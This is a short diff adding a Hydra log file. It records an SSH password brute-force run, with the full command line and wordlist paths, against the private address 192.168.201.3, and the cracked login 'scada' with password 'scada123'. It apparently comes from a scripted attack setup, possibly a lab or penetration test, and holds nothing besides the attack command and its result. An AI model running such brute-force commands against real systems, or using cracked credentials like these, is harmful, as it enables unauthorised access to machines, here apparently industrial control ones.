@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2026-09-09 19:55:22 on 192.168.201.3 ssh (hydra -L /scripts/attack2/wordlists/users.txt -P /scripts/attack2/wordlists/passwords.txt -t 2 -o /scripts/attack2/./hydra/hydra_ssh_192_168_201_3_20260909_195522.txt -f -V ssh://192.168.201.3:22)
+[22][ssh] host: 192.168.201.3   login: scada   password: scada123
